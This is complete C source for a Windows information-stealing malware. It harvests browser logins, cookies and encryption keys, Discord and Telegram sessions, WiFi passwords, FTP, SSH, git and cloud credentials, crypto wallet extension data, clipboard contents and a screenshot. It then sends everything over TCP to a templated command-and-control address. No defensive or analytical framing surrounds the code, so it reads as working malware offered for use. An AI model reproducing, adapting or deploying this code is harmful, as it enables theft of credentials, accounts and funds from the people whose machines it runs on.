#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdi32.lib")

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}
#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void emit(const char *d, DWORD n) {
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD need = g_pos + n + (256 * 1024);
        char *re = (char *)realloc(g_data, need);
        if (!re) return;
        g_data = re;
        g_cap = need;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}

static void emit_file(const char *path, DWORD max_sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz > max_sz) { CloseHandle(h); return; }
    BYTE *buf = (BYTE *)malloc(sz);
    if (buf) {
        DWORD rd;
        if (ReadFile(h, buf, sz, &rd, NULL) && rd > 0)
            emit((const char *)buf, rd);
        free(buf);
    }
    CloseHandle(h);
}

static void grab_file(const char *src, const char *tag, DWORD max_sz) {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    char dst[MAX_PATH];
    snprintf(dst, MAX_PATH, "%s\\~%lx.tmp", temp, GetTickCount());
    if (CopyFileA(src, dst, FALSE)) {
        emitf("  [%s] %lu bytes\r\n", tag, (unsigned long)GetFileSize(
            CreateFileA(dst, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL), NULL));
        emit_file(dst, max_sz);
        DeleteFileA(dst);
    }
}

static void run_cmd(const char *cmd, char *out, DWORD out_sz, DWORD *out_len) {
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hRead, hWrite;
    *out_len = 0;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    char buf[512];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, 15000);
    DWORD total = 0, rd = 0;
    while (total < out_sz - 1 && ReadFile(hRead, out + total, out_sz - total - 1, &rd, NULL) && rd > 0)
        total += rd;
    out[total] = '\0';
    *out_len = total;
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

/* ── system fingerprint ─────────────────────────────────────────── */

static void collect_system_info(void) {
    emitf("=== SYSTEM INFO ===\r\n");

    char hostname[256] = {0};
    DWORD hn = sizeof(hostname);
    if (GetComputerNameA(hostname, &hn)) emitf("Hostname: %s\r\n", hostname);

    char user[256] = {0};
    DWORD un = sizeof(user);
    if (GetUserNameA(user, &un)) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n", ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? "ARM64" : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * 1024));

    ULONG al = 0;
    GetAdaptersInfo(NULL, &al);
    if (al > 0) {
        PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(al);
        if (ai && GetAdaptersInfo(ai, &al) == NO_ERROR) {
            for (PIP_ADAPTER_INFO p = ai; p; p = p->Next)
                emitf("NIC: %s  IP: %s  MAC: %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                      p->Description, p->IpAddressList.IpAddress.String,
                      p->Address[0], p->Address[1], p->Address[2],
                      p->Address[3], p->Address[4], p->Address[5]);
        }
        free(ai);
    }

    char cmd_out[4096] = {0};
    DWORD cmd_len = 0;
    run_cmd("cmd /c systeminfo | findstr /B /C:\"Domain\" /C:\"Logon Server\"",
            cmd_out, sizeof(cmd_out), &cmd_len);
    if (cmd_len > 0) emitf("%s", cmd_out);

    emitf("\r\n");
}

/* ── running processes ──────────────────────────────────────────── */

static void collect_processes(void) {
    emitf("=== RUNNING PROCESSES ===\r\n");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            emitf("  [%5lu] %s\r\n", pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    emitf("\r\n");
}

/* ── installed software ─────────────────────────────────────────── */

static void enum_installed_from_key(HKEY root, const char *subkey) {
    HKEY hk;
    if (RegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &hk) != ERROR_SUCCESS)
        return;
    char name[256];
    DWORD idx = 0, name_sz;
    while (1) {
        name_sz = sizeof(name);
        if (RegEnumKeyExA(hk, idx++, name, &name_sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        HKEY sub;
        if (RegOpenKeyExA(hk, name, 0, KEY_READ, &sub) == ERROR_SUCCESS) {
            char display[256] = {0}, version[64] = {0};
            DWORD dsz = sizeof(display), vsz = sizeof(version);
            RegQueryValueExA(sub, "DisplayName", NULL, NULL, (BYTE *)display, &dsz);
            RegQueryValueExA(sub, "DisplayVersion", NULL, NULL, (BYTE *)version, &vsz);
            if (display[0])
                emitf("  %s %s\r\n", display, version);
            RegCloseKey(sub);
        }
    }
    RegCloseKey(hk);
}

static void collect_installed_software(void) {
    emitf("=== INSTALLED SOFTWARE ===\r\n");
    enum_installed_from_key(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    enum_installed_from_key(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    emitf("\r\n");
}

/* ── wifi passwords ─────────────────────────────────────────────── */

static void collect_wifi(void) {
    emitf("=== WIFI PASSWORDS ===\r\n");
    char raw[8192] = {0};
    DWORD raw_len = 0;
    run_cmd("cmd /c netsh wlan show profiles", raw, sizeof(raw), &raw_len);
    if (raw_len == 0) { emitf("(no wlan service)\r\n\r\n"); return; }

    char *line = raw;
    while (*line) {
        char *eol = strchr(line, '\n');
        if (!eol) eol = line + strlen(line);
        char *colon = strstr(line, ": ");
        if (colon && (strstr(line, "All User Profile") || strstr(line, "Profile"))) {
            char *ns = colon + 2;
            while (*ns == ' ') ns++;
            int nl = (int)(eol - ns);
            while (nl > 0 && (ns[nl-1] == '\r' || ns[nl-1] == '\n' || ns[nl-1] == ' ')) nl--;
            if (nl > 0 && nl < 200) {
                char ssid[256] = {0};
                strncpy(ssid, ns, nl);
                char cmd2[512];
                snprintf(cmd2, sizeof(cmd2), "cmd /c netsh wlan show profile name=\"%s\" key=clear", ssid);
                char prof[4096] = {0};
                DWORD pl = 0;
                run_cmd(cmd2, prof, sizeof(prof), &pl);
                char *kc = strstr(prof, "Key Content");
                if (!kc) kc = strstr(prof, "key content");
                if (kc) {
                    char *kv = strchr(kc, ':');
                    if (kv) {
                        kv++; while (*kv == ' ') kv++;
                        char *ke = strchr(kv, '\r');
                        if (!ke) ke = strchr(kv, '\n');
                        int kl = ke ? (int)(ke - kv) : (int)strlen(kv);
                        emitf("SSID: %s  Key: %.*s\r\n", ssid, kl, kv);
                    }
                } else {
                    emitf("SSID: %s  Key: (open)\r\n", ssid);
                }
            }
        }
        if (*eol) line = eol + 1; else break;
    }
    emitf("\r\n");
}

/* ── chromium browser harvesting (adaptive) ─────────────────────── */

typedef struct {
    const char *name;
    const char *subpath;
} browser_def;

static const browser_def CHROMIUM_BROWSERS[] = {
    {"Chrome",       "Google\\Chrome\\User Data"},
    {"Edge",         "Microsoft\\Edge\\User Data"},
    {"Brave",        "BraveSoftware\\Brave-Browser\\User Data"},
    {"Opera",        "Opera Software\\Opera Stable"},
    {"OperaGX",      "Opera Software\\Opera GX Stable"},
    {"Vivaldi",      "Vivaldi\\User Data"},
    {"Chromium",     "Chromium\\User Data"},
    {"Yandex",       "Yandex\\YandexBrowser\\User Data"},
};
#define N_BROWSERS (sizeof(CHROMIUM_BROWSERS) / sizeof(CHROMIUM_BROWSERS[0]))

static void harvest_chromium_profile(const char *browser_name, const char *base, const char *profile) {
    char login[MAX_PATH], cookies[MAX_PATH], history[MAX_PATH], bookmarks[MAX_PATH], webdata[MAX_PATH];
    snprintf(login,     MAX_PATH, "%s\\%s\\Login Data",  base, profile);
    snprintf(cookies,   MAX_PATH, "%s\\%s\\Cookies",     base, profile);
    snprintf(history,   MAX_PATH, "%s\\%s\\History",     base, profile);
    snprintf(bookmarks, MAX_PATH, "%s\\%s\\Bookmarks",   base, profile);
    snprintf(webdata,   MAX_PATH, "%s\\%s\\Web Data",    base, profile);

    int found = 0;
    if (file_exists(login))     { grab_file(login,     "LoginData",  5*1024*1024); found++; }
    if (file_exists(cookies))   { grab_file(cookies,   "Cookies",    5*1024*1024); found++; }
    if (file_exists(webdata))   { grab_file(webdata,   "WebData",    5*1024*1024); found++; }
    if (file_exists(history))   { grab_file(history,   "History",    5*1024*1024); found++; }
    if (file_exists(bookmarks)) { grab_file(bookmarks, "Bookmarks",  2*1024*1024); found++; }

    if (found) emitf("  %s/%s: %d files\r\n", browser_name, profile, found);
}

static void collect_browsers(void) {
    emitf("=== BROWSER DATA ===\r\n");

    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char base[MAX_PATH];
        snprintf(base, MAX_PATH, "%s\\%s", local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(base)) continue;

        emitf("[%s]\r\n", CHROMIUM_BROWSERS[b].name);

        char ls_path[MAX_PATH];
        snprintf(ls_path, MAX_PATH, "%s\\Local State", base);
        if (file_exists(ls_path)) {
            char tmp_ls[MAX_PATH], temp[MAX_PATH];
            GetTempPathA(MAX_PATH, temp);
            snprintf(tmp_ls, MAX_PATH, "%s\\~ls%lx.tmp", temp, GetTickCount());
            if (CopyFileA(ls_path, tmp_ls, FALSE)) {
                HANDLE h = CreateFileA(tmp_ls, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, 0, NULL);
                if (h != INVALID_HANDLE_VALUE) {
                    DWORD sz = GetFileSize(h, NULL);
                    if (sz > 0 && sz < 2*1024*1024) {
                        char *d = (char *)malloc(sz + 1);
                        if (d) {
                            DWORD rd; ReadFile(h, d, sz, &rd, NULL); d[rd] = '\0';
                            char *ek = strstr(d, "encrypted_key");
                            if (ek) {
                                char *q1 = strchr(ek + 15, '"');
                                if (q1) {
                                    char *q2 = strchr(q1 + 1, '"');
                                    if (q2) {
                                        int kl = (int)(q2 - q1 - 1);
                                        emitf("  master_key[%d]: %.*s\r\n", kl, kl > 300 ? 300 : kl, q1+1);
                                    }
                                }
                            }
                            free(d);
                        }
                    }
                    CloseHandle(h);
                }
                DeleteFileA(tmp_ls);
            }
        }

        harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, "Default");
        char prof_dir[MAX_PATH];
        for (int p = 1; p <= 10; p++) {
            char pname[32];
            snprintf(pname, sizeof(pname), "Profile %d", p);
            snprintf(prof_dir, MAX_PATH, "%s\\%s", base, pname);
            if (file_exists(prof_dir))
                harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, pname);
        }
    }
    emitf("\r\n");
}

/* ── discord tokens ─────────────────────────────────────────────── */

static void scan_ldb_for_tokens(const char *dir) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.ldb", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
        HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD sz = GetFileSize(h, NULL);
        if (sz > 0 && sz < 5*1024*1024) {
            char *buf = (char *)malloc(sz + 1);
            if (buf) {
                DWORD rd; ReadFile(h, buf, sz, &rd, NULL); buf[rd] = '\0';
                char *p = buf;
                while ((p = strstr(p, "dQw4w9WgXcQ:")) != NULL) {
                    char *start = p;
                    char *end = strchr(p, '"');
                    if (!end) end = p + 120;
                    int tl = (int)(end - start);
                    if (tl > 0 && tl < 500)
                        emitf("  token: %.*s\r\n", tl, start);
                    p = end;
                }
                p = buf;
                while ((p = strstr(p, "mfa.")) != NULL) {
                    char *end = p;
                    while (*end && *end != '"' && *end != '\'' && (end - p) < 100) end++;
                    emitf("  mfa_token: %.*s\r\n", (int)(end - p), p);
                    p = end;
                }
                free(buf);
            }
        }
        CloseHandle(h);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

static void collect_discord(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    const char *variants[] = {
        "discord\\Local Storage\\leveldb",
        "discordptb\\Local Storage\\leveldb",
        "discordcanary\\Local Storage\\leveldb",
    };
    int found = 0;
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", roaming, variants[i]);
        if (file_exists(path)) {
            if (!found) emitf("=== DISCORD TOKENS ===\r\n");
            found = 1;
            emitf("[%s]\r\n", variants[i]);
            scan_ldb_for_tokens(path);
        }
    }
    if (found) emitf("\r\n");
}

/* ── telegram session ───────────────────────────────────────────── */

static void collect_telegram(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;
    char tdata[MAX_PATH];
    snprintf(tdata, MAX_PATH, "%s\\Telegram Desktop\\tdata", roaming);
    if (!file_exists(tdata)) return;

    emitf("=== TELEGRAM ===\r\n");

    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\D877F783D5D3EF8C*", tdata);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pattern, &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do {
            char full[MAX_PATH];
            snprintf(full, MAX_PATH, "%s\\%s", tdata, fd.cFileName);
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                emitf("  session_file: %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                emit_file(full, 1*1024*1024);
            }
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }

    char keydata[MAX_PATH];
    snprintf(keydata, MAX_PATH, "%s\\key_datas", tdata);
    if (file_exists(keydata)) {
        emitf("  key_datas: present\r\n");
        emit_file(keydata, 512*1024);
    }
    emitf("\r\n");
}

/* ── filezilla / winscp credentials ─────────────────────────────── */

static void collect_ftp_clients(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    char fz_recent[MAX_PATH], fz_site[MAX_PATH];
    snprintf(fz_recent, MAX_PATH, "%s\\FileZilla\\recentservers.xml", roaming);
    snprintf(fz_site,   MAX_PATH, "%s\\FileZilla\\sitemanager.xml",   roaming);

    int found = 0;
    if (file_exists(fz_recent) || file_exists(fz_site)) {
        if (!found) emitf("=== FTP CREDENTIALS ===\r\n");
        found = 1;
        if (file_exists(fz_recent)) {
            emitf("[FileZilla recentservers.xml]\r\n");
            emit_file(fz_recent, 1*1024*1024);
        }
        if (file_exists(fz_site)) {
            emitf("[FileZilla sitemanager.xml]\r\n");
            emit_file(fz_site, 1*1024*1024);
        }
    }

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (!found) emitf("=== FTP CREDENTIALS ===\r\n");
        found = 1;
        emitf("[WinSCP sessions]\r\n");
        char name[256]; DWORD idx = 0, nsz;
        while (1) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(hk, idx++, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            HKEY sess;
            if (RegOpenKeyExA(hk, name, 0, KEY_READ, &sess) == ERROR_SUCCESS) {
                char host[256] = {0}, user[256] = {0}, pass[256] = {0};
                DWORD hs = sizeof(host), us = sizeof(user), ps = sizeof(pass);
                RegQueryValueExA(sess, "HostName", NULL, NULL, (BYTE*)host, &hs);
                RegQueryValueExA(sess, "UserName", NULL, NULL, (BYTE*)user, &us);
                RegQueryValueExA(sess, "Password", NULL, NULL, (BYTE*)pass, &ps);
                emitf("  %s@%s pass=%s\r\n", user, host, pass[0] ? pass : "(key-based)");
                RegCloseKey(sess);
            }
        }
        RegCloseKey(hk);
    }

    if (found) emitf("\r\n");
}

/* ── ssh keys & git credentials ─────────────────────────────────── */

static void collect_ssh_git(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    char ssh_dir[MAX_PATH];
    snprintf(ssh_dir, MAX_PATH, "%s\\.ssh", home);
    if (file_exists(ssh_dir)) {
        emitf("=== SSH KEYS ===\r\n");
        const char *key_files[] = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts"};
        for (int i = 0; i < 6; i++) {
            char kp[MAX_PATH];
            snprintf(kp, MAX_PATH, "%s\\%s", ssh_dir, key_files[i]);
            if (file_exists(kp)) {
                emitf("[%s]\r\n", key_files[i]);
                emit_file(kp, 256*1024);
                emitf("\r\n");
            }
        }
        emitf("\r\n");
    }

    char git_cred[MAX_PATH];
    snprintf(git_cred, MAX_PATH, "%s\\.git-credentials", home);
    if (file_exists(git_cred)) {
        emitf("=== GIT CREDENTIALS ===\r\n");
        emit_file(git_cred, 256*1024);
        emitf("\r\n\r\n");
    }
}

/* ── cloud credentials (AWS/Azure/GCP) ──────────────────────────── */

static void collect_cloud_creds(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    struct { const char *name; const char *rel; } cloud_files[] = {
        {"AWS credentials",      ".aws\\credentials"},
        {"AWS config",           ".aws\\config"},
        {"Azure profile",        ".azure\\azureProfile.json"},
        {"Azure tokens",         ".azure\\accessTokens.json"},
        {"GCP app creds",        "AppData\\Roaming\\gcloud\\application_default_credentials.json"},
        {"GCP properties",       "AppData\\Roaming\\gcloud\\properties"},
        {"kubectl config",       ".kube\\config"},
        {"Docker config",        ".docker\\config.json"},
    };

    int found = 0;
    for (int i = 0; i < (int)(sizeof(cloud_files)/sizeof(cloud_files[0])); i++) {
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", home, cloud_files[i].rel);
        if (file_exists(full)) {
            if (!found) emitf("=== CLOUD CREDENTIALS ===\r\n");
            found = 1;
            emitf("[%s]\r\n", cloud_files[i].name);
            emit_file(full, 512*1024);
            emitf("\r\n");
        }
    }
    if (found) emitf("\r\n");
}

/* ── crypto wallet extensions ───────────────────────────────────── */

static void collect_crypto_wallets(void) {
    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    struct { const char *name; const char *ext_id; } wallets[] = {
        {"MetaMask",     "nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom",      "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase",     "hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Ronin",        "fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"TronLink",     "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Exodus",       "aholpfdialjgjfhomihkjbmgjidlcdno"},
    };

    int found = 0;
    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char ext_base[MAX_PATH];
        snprintf(ext_base, MAX_PATH, "%s\\%s\\Default\\Local Extension Settings",
                 local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(ext_base)) continue;

        for (int w = 0; w < (int)(sizeof(wallets)/sizeof(wallets[0])); w++) {
            char wdir[MAX_PATH];
            snprintf(wdir, MAX_PATH, "%s\\%s", ext_base, wallets[w].ext_id);
            if (!file_exists(wdir)) continue;

            if (!found) emitf("=== CRYPTO WALLETS ===\r\n");
            found = 1;
            emitf("[%s in %s]\r\n", wallets[w].name, CHROMIUM_BROWSERS[b].name);

            char wpat[MAX_PATH];
            snprintf(wpat, MAX_PATH, "%s\\*.ldb", wdir);
            WIN32_FIND_DATAA fd;
            HANDLE hf = FindFirstFileA(wpat, &fd);
            if (hf != INVALID_HANDLE_VALUE) {
                do {
                    char fp[MAX_PATH];
                    snprintf(fp, MAX_PATH, "%s\\%s", wdir, fd.cFileName);
                    emitf("  %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                    emit_file(fp, 2*1024*1024);
                } while (FindNextFileA(hf, &fd));
                FindClose(hf);
            }
        }
    }
    if (found) emitf("\r\n");
}

/* ── clipboard ──────────────────────────────────────────────────── */

static void collect_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf("=== CLIPBOARD ===\r\n");
            int len = (int)strlen(txt);
            emitf("%.*s\r\n\r\n", len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}

/* ── screenshot ─────────────────────────────────────────────────── */

static void collect_screenshot(void) {
    HDC hScreen = GetDC(NULL);
    if (!hScreen) return;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    DWORD row = ((w * 3 + 3) & ~3);
    DWORD img_sz = row * h;

    BYTE *pixels = (BYTE *)malloc(img_sz);
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

        BITMAPFILEHEADER bf = {0};
        bf.bfType = 0x4D42;
        bf.bfSize = sizeof(bf) + sizeof(bi) + img_sz;
        bf.bfOffBits = sizeof(bf) + sizeof(bi);

        emitf("=== SCREENSHOT ===\r\n");
        emitf("  %dx%d BMP (%lu bytes)\r\n", w, h, bf.bfSize);
        emit((const char *)&bf, sizeof(bf));
        emit((const char *)&bi, sizeof(bi));
        emit((const char *)pixels, img_sz);
        emitf("\r\n");
        free(pixels);
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}

/* ── environment variables of interest ──────────────────────────── */

static void collect_env_vars(void) {
    emitf("=== ENVIRONMENT VARS ===\r\n");
    const char *interesting[] = {
        "USERDOMAIN", "LOGONSERVER", "COMPUTERNAME", "USERNAME",
        "HOMEPATH", "USERPROFILE", "PATH",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "AZURE_SUBSCRIPTION_ID", "AZURE_TENANT_ID", "AZURE_CLIENT_SECRET",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN",
        "DOCKER_HOST", "KUBECONFIG",
        "DATABASE_URL", "MONGO_URI", "REDIS_URL",
        "SLACK_TOKEN", "SLACK_WEBHOOK_URL",
        "SMTP_PASSWORD", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
        "STRIPE_SECRET_KEY", "TWILIO_AUTH_TOKEN",
        "JWT_SECRET", "SECRET_KEY", "API_KEY", "API_SECRET",
    };
    for (int i = 0; i < (int)(sizeof(interesting)/sizeof(interesting[0])); i++) {
        char val[2048] = {0};
        DWORD r = GetEnvironmentVariableA(interesting[i], val, sizeof(val));
        if (r > 0)
            emitf("  %s=%s\r\n", interesting[i], val);
    }
    emitf("\r\n");
}

/* ── exfiltration ───────────────────────────────────────────────── */

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int retries = 3;
    while (retries-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        if (retries > 0) { closesocket(sock); Sleep(2000);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, (len - sent > 32768) ? 32768 : len - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
    closesocket(sock);
    WSACleanup();
    return sent == len;
}

/* ── main ───────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    g_data = (char *)malloc(COLLECT_BUF);
    if (!g_data) return 1;
    g_cap = COLLECT_BUF;
    g_pos = 0;

    collect_system_info();
    collect_processes();
    collect_installed_software();
    collect_env_vars();
    collect_clipboard();
    collect_wifi();
    collect_browsers();
    collect_discord();
    collect_telegram();
    collect_ftp_clients();
    collect_ssh_git();
    collect_cloud_creds();
    collect_crypto_wallets();
    collect_screenshot();

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}
